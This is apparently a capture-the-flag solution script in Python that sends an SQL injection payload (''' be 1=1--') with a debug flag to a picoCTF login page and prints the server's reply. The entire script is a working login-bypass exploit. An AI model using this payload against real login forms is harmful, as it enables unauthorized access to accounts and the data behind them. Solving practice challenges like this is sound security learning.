import requests

s = requests.Session()

exploit = {
    'password' : """' be 1=1--""",
    'debug' : '1'
}

resp = s.post("https://jupiter.challenges.picoctf.org/problem/40742/login.php", data=exploit)
print(resp.text)
